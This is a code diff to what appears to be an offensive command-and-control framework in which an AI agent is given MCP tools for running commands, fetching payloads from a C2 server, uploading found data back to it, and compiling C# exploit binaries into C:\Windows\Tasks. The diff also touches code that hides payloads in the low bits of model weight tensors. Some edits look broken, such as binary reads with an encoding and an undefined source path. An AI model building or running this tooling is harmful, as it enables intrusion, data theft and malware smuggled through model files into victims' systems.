@@ -10,6 +10,7 @@ import importlib
 import copy
 import io
 import zipfile
+import inspect
 
 import torch.nn as nn
 import torch.optim as optim
@@ -590,52 +591,51 @@ def payload_enc(legitimate_state_dict_file: str, target_key: str, num_lsb: int, 
         raise  # Re-raise the exception
         
 @MCP_SERVER.tool()
-def load_file(absolute_path: str) -> str:
+def download_file(absolute_path: str) -> bytes:
     """
-    Reads the content of a file from the local filesystem on the machine on which you are deployed.
+    Reads a file on the C2 server and returns its contents, returning a bytes object. Useful for deploying payloads in yout current environment.
 
     Args:
-        absolute_path (str): the full path of the file to read
+        absolute_path (str): the full path of the file to read from the server
 
     Returns:
-        str: Either the contents of the file that was read if the read was successful or an error message if the read failed
+        bytes: Either the contents of the file that was read if the read was successful or an error message if the read failed
     """
     try:
-        with open(absolute_path, 'r', encoding='utf-8') as f:
+        with open(absolute_path, 'rb', encoding='utf-8') as f:
             return f.read()
     except Exception as e:
         return f"Error: {str(e)}"
 
 @MCP_SERVER.tool()
-def drop_file(absolute_path: str, contents: bytearray):
+def upload_file(server_path: str, contents: bytearray) -> str:
     """
-    Writes a file to the local filesystem on the machine on which you are deployed.
+    Uploads a file from the machine to which you are deployed back to the server. This is useful if you've found some valuable information during the course of the engagement.
 
     Args:
-        absolute_path (str): the full path of the file to drop
-        contents (bytearray): the data to save at the full path in question
-
-    Prints: an error message if an error occurred during the write attempt
+        server_path (str): the server-side upload path
+        contents (bytearray): the data to save at the uploaded destination
     
     Returns:
-        None: drops a file to the file system instead.
+        str: A status message, indicating whether the upload succeeded or failed. If it failed, a debug message will be included in this.
     """
     try:
-        with open(absolute_path, 'wb') as f:
+        with open(server_path, 'wb') as f:
             f.write(contents)
+            return "Upload successful"
     except Exception as e:
-        print(f"Error: {str(e)}")
+        return f"Error: {str(e)}"
 
 @MCP_SERVER.tool()
 def run_system_command(cli_args: list[str]) -> str:
     """
-    Runs a system command on the machine on which you are deployed and returns the output of the command in question.
+    Runs a system command and returns the output of the command in question. When called via MCP `await client.call_tool`, this executes a command on the C2 server. When called directly, it executes a command on your local system.
     
     Args:
         cli_args (list[str]): An array list of parameters that this tool passes to `subprocess.run()` to execute the command.
 
     Returns:
-        str: The output of the command that was executed.
+        str: Either the output of the command that was executed or an error message if the command execution failed.
     """
     try:
         # Use subprocess.run with list args for OPSEC
@@ -652,24 +652,19 @@ def run_system_command(cli_args: list[str]) -> str:
         return str(e)
 
 @MCP_SERVER.tool()
-def build_windows_payload(code: str, compiler_dir: str, source_path: str, exe_path: str):
+def build_csharp_payload(code: str):
     """
-    Uses csc.exe to compile a C# code snippet that you may have generated on the machine on which you are deployed.
+    Uses csc.exe on the server to compile C# source code that you may have generated to exploit a suspected vulnerability.
     
     Args:
-        code (str): The C# code snippet that you've generated to attempt to exploit a suspected vulnerability.
-        compiler_dir (str): The Windows directory on the target in which the compiler is located. By default, this is C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 on Windows 11/Server 2025, but it may be different depending on the target Windows version (you can use the `run_system_command` tool with `['powershell', '-c', 'Get-ChildItem', '-Recurse', '-Force', 'C:\\Windows\\Microsoft.NET', -Filter', 'csc.exe']` as the argument to debug this).
-        source_path (str): The path to file to save the code snippet to.
-        exe_path (str): The path to the resulting binary.
-
-    Prints: an error message if a compilation or file operation error occurred during the attempt to compile the code.
+        code (str): The C# code snippet that you've generated.
 
     Returns:
-        None: outputs a command that you are to use the `run_system_command()` tool to execute.
+        io.BytesIO: BytesIO object containing the resulting executable
     """
     try:
-        drop_file(source_path, code)
-        run_system_command([str(Path(compiler_dir) / 'csc.exe'), f'/out:{exe_path}', '/platform:x64', source_path])
+        upload_file(os.getcwd(), code)
+        _ = run_system_command(['C:\\Program Files\\Microsoft Visual Studio\\18\\Insiders\\MSBuild\\Current\\Bin\\Roslyn\\csc.exe', f'/out:C:\\Windows\\Tasks\\temp.exe', '/platform:x64', source_path])
     except Exception as e:
         print(f"Error: {str(e)}")
 
@@ -784,7 +779,12 @@ def stage_encoded(model_id: str, target_key: str, num_lsb: int, server: FastMCP 
         num_lsb (int): Number of mantissa bits to modify
 
     Returns:
-        Tuple[io.BytesIO, transformers.AutoConfig]: Tuple of a BytesIO object containing the modified weights and the configuration to allow a `transformers.AutoModel` to be created from such
+        Tuple[io.BytesIO, transformers.AutoConfig]: Tuple of a BytesIO object containing the modified weights and the configuration to allow a `transformers.AutoModel` to be created from such.
+
+    Raises:
+        FileNotFoundError: If the base model file does not exist
+        KeyError: If the target key specified by the `target_key` parameter doesn't exist
+        ValueError: If the payload is too big to fit in the target tensor
     """
 
     # This is custom middleware I wrote myself which is added automatically by the system_prompt() initializer function, so should never be None
@@ -809,6 +809,9 @@ from fastmcp import Client, FastMCP
 
 from fastmcp.client.sampling import SamplingMessage, SamplingParams, RequestContext
 from fastmcp.client.sampling.handlers.base import SamplingHandler
+
+# Include a local copy of the `run_system_command` tool so the agent doesn't need to reach out to the C2 server each time a command execution is necesary
+{inspect.getsource(run_system_command)}
 
 def install_missing(zip_file_path: io.BytesIO):
     """Extracts and installs missing wheels directly from an in-memory ZIP byte stream."""
@@ -948,7 +951,7 @@ MASTER_MCP_CLIENT = Client("http://{ip}:{port}/mcp/", sampling_handler=handler)
         raise KeyError(
             f"Target key '{target_key}' not found in state dict. Available keys: {list(loaded_state_dict.keys())}"
         )
-    
+
     original_target_tensor = loaded_state_dict[target_key]
     print(
         f"Selected target tensor '{target_key}' with shape {original_target_tensor.shape} and {original_target_tensor.numel()} elements."
@@ -959,7 +962,7 @@ MASTER_MCP_CLIENT = Client("http://{ip}:{port}/mcp/", sampling_handler=handler)
     bits_needed = bytes_to_embed * 8
     elements_needed = (bits_needed + num_lsb - 1) // num_lsb  # Ceiling division
     print(f"Payload requires {elements_needed} elements using {num_lsb} LSBs.")
-    
+
     if original_target_tensor.numel() < elements_needed:
         raise ValueError(f"Target tensor '{target_key}' is too small for the payload!")
 
